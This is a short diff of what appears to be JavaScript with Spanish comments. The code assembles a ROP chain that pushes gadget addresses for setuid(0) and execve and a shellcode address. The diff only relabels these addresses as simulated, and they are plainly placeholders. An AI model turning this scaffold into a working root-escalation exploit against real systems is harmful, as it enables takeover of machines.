@@ -67,10 +67,10 @@
 
             let chain = [];
 
-            // Gadget para llamar a setuid(0) - Cambiar a root (ID de usuario 0)
+            // Direcciones simuladas de gadgets
             let setuidGadget = 0x12345678; // Dirección de un gadget que invoca setuid(0) (simulada)
             let execveGadget = 0x23456789; // Dirección de un gadget para invocar execve (simulada)
-            let shellcodeAddress = 0x7ff8000000000000; // Dirección donde se inyecta el shellcode
+            let shellcodeAddress = 0x7ff8000000000000; // Dirección donde se inyecta el shellcode (simulada)
 
             // Instrucciones para la cadena ROP
             chain.push(setuidGadget); // Llamada a setuid(0) para cambiar a root
